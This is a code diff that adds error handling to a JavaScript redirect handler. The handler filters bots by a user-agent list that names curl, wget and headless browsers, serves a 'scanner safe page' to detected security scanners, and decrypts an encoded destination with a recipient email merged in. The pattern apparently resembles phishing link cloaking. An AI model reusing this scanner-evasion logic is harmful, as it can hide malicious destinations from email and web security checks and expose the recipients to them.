@@ -2943,67 +2943,73 @@ function validateAndRedirect(finalUrl, req, res, options = {}) {
 }
 
 async function handleRedirectCore(req, res, baseString){
-  const clientIp = getClientIp(req);
-  const ua = req.get("user-agent") || "";
-  const linkHash = req.query.lh ? String(req.query.lh) : hashFirstSeg(baseString);
-  const hasSecUA = !!req.get("sec-ch-ua");
-  const hasFetchSite = !!req.get("sec-fetch-site");
-  const missingSecHeaders = !hasSecUA || !hasFetchSite;
-  const knownBots = ["Googlebot","Bingbot","Slurp","DuckDuckBot","Baiduspider","YandexBot","Sogou","Exabot","facebot","facebookexternalhit","ia_archiver","MJ12bot","AhrefsBot","SemrushBot","DotBot","PetalBot","GPTBot","python-requests","crawler","scrapy","curl","wget","phantomjs","HeadlessChrome"];
-  const isBotUA = knownBots.some(b => ua.toLowerCase().includes(b.toLowerCase()));
-  const hasTurnstileToken = !!req.query.cft;
+  try {
+    const clientIp = getClientIp(req);
+    const ua = req.get("user-agent") || "";
+    const linkHash = req.query.lh ? String(req.query.lh) : hashFirstSeg(baseString);
+    const hasSecUA = !!req.get("sec-ch-ua");
+    const hasFetchSite = !!req.get("sec-fetch-site");
+    const missingSecHeaders = !hasSecUA || !hasFetchSite;
+    const knownBots = ["Googlebot","Bingbot","Slurp","DuckDuckBot","Baiduspider","YandexBot","Sogou","Exabot","facebot","facebookexternalhit","ia_archiver","MJ12bot","AhrefsBot","SemrushBot","DotBot","PetalBot","GPTBot","python-requests","crawler","scrapy","curl","wget","phantomjs","HeadlessChrome"];
+    const isBotUA = knownBots.some(b => ua.toLowerCase().includes(b.toLowerCase()));
+    const hasTurnstileToken = !!req.query.cft;
 
-  const securityCheck = checkSecurityPolicies(req);
-  if (securityCheck.blocked) {
-    if (securityCheck.interstitial) {
-      const nextEnc = encodeURIComponent(baseString);
-      const scannerReason = securityCheck.scannerReason || "Known scanner UA";
-      logScannerHit(req, scannerReason, nextEnc);
-      return renderScannerSafePage(req, res, nextEnc, scannerReason, {
-        scannerProfile: securityCheck.scannerProfile
-      });
+    const securityCheck = checkSecurityPolicies(req);
+    if (securityCheck.blocked) {
+      if (securityCheck.interstitial) {
+        const nextEnc = encodeURIComponent(baseString);
+        const scannerReason = securityCheck.scannerReason || "Known scanner UA";
+        logScannerHit(req, scannerReason, nextEnc);
+        return renderScannerSafePage(req, res, nextEnc, scannerReason, {
+          scannerProfile: securityCheck.scannerProfile
+        });
+      }
+      return res.status(securityCheck.status).send(securityCheck.message);
     }
-    return res.status(securityCheck.status).send(securityCheck.message);
-  }
 
-  const authCheck = await verifyTurnstileAndRateLimit(req, baseString);
-  if (authCheck.redirect) {
-    return res.redirect(302, authCheck.redirect);
-  }
-  if (authCheck.blocked) {
-    if (authCheck.retryAfter) {
-      res.setHeader("Retry-After", authCheck.retryAfter);
+    const authCheck = await verifyTurnstileAndRateLimit(req, baseString);
+    if (authCheck.redirect) {
+      return res.redirect(302, authCheck.redirect);
     }
-    return res.status(authCheck.status).send(authCheck.message);
-  }
+    if (authCheck.blocked) {
+      if (authCheck.retryAfter) {
+        res.setHeader("Retry-After", authCheck.retryAfter);
+      }
+      return res.status(authCheck.status).send(authCheck.message);
+    }
 
-  if (isBotUA || missingSecHeaders) {
-    const reason = isBotUA ? "bot_heuristic" : "missing_sec_headers";
-    const logCtx = {
-      ip: safeLogValue(clientIp),
-      uaHash: hashUaForToken(ua),
-      linkHash: safeLogValue(linkHash, 64),
-      isBotUA,
-      missingSecHeaders,
-      hasSecUA: !!hasSecUA,
-      hasFetchSite: !!hasFetchSite
-    };
-    addLog(`[CHALLENGE-TRIGGER] ${safeLogJson(logCtx, LOG_ENTRY_MAX_LENGTH)}`);
+    if (isBotUA || missingSecHeaders) {
+      const reason = isBotUA ? "bot_heuristic" : "missing_sec_headers";
+      const logCtx = {
+        ip: safeLogValue(clientIp),
+        uaHash: hashUaForToken(ua),
+        linkHash: safeLogValue(linkHash, 64),
+        isBotUA,
+        missingSecHeaders,
+        hasSecUA: !!hasSecUA,
+        hasFetchSite: !!hasFetchSite
+      };
+      addLog(`[CHALLENGE-TRIGGER] ${safeLogJson(logCtx, LOG_ENTRY_MAX_LENGTH)}`);
+      addSpacer();
+
+      if (!hasTurnstileToken) {
+        const reasonParam = sanitizeChallengeReason(reason);
+        return res.redirect(302, createChallengeRedirect(baseString, req, reasonParam));
+      }
+    }
+
+    const decryptResult = decryptAndParseUrl(req, baseString);
+    if (decryptResult.error) {
+      return res.status(400).send(decryptResult.error);
+    }
+
+    const finalUrl = processEmailAndFinalizeUrl(decryptResult.finalUrl, decryptResult.emailPart);
+    return validateAndRedirect(finalUrl, req, res, { pinnedHost: decryptResult.pinnedHost, linkHash: decryptResult.linkHash });
+  } catch (e) {
+    addLog(`[REDIRECT-ERROR] ip=${safeLogValue(getClientIp(req))} path=${safeLogValue(req.originalUrl || '', PATH_TRUNCATE_LENGTH)} err=${safeLogValue(e?.message || 'unknown')}`);
     addSpacer();
-
-    if (!hasTurnstileToken) {
-      const reasonParam = sanitizeChallengeReason(reason);
-      return res.redirect(302, createChallengeRedirect(baseString, req, reasonParam));
-    }
+    return res.status(500).send("Temporary error");
   }
-
-  const decryptResult = decryptAndParseUrl(req, baseString);
-  if (decryptResult.error) {
-    return res.status(400).send(decryptResult.error);
-  }
-
-  const finalUrl = processEmailAndFinalizeUrl(decryptResult.finalUrl, decryptResult.emailPart);
-  return validateAndRedirect(finalUrl, req, res, { pinnedHost: decryptResult.pinnedHost, linkHash: decryptResult.linkHash });
 }
 
 // ================== MIDDLEWARE SETUP ==================
